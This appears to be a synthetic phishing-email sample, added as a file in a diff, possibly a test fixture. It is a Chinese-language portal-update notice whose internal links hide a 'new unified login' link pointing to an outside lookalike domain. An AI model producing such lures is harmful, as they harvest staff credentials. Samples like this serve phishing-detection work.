@@ -1,0 +1,10 @@
+From: =?utf-8?B?5ZGY5bel5pyN5Yqh6Zeo5oi3?= <svc@portal-relay2.example>
+To: staff@corp.internal
+Date: Mon, 07 Sep 2026 09:20:00 +0800
+Message-ID: <0010-b15@synth.example>
+Subject: 门户功能导航更新
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>门户导航更新，常用入口：</p><p><a href='https://portal.corp.internal/it'>IT 服务</a> | <a href='https://portal.corp.internal/hr'>HR</a> | <a href='https://portal.corp.internal/fin'>财务</a> | <a href='https://portal-relay2.example.info/sso'>统一登录（新）</a></p></body></html>
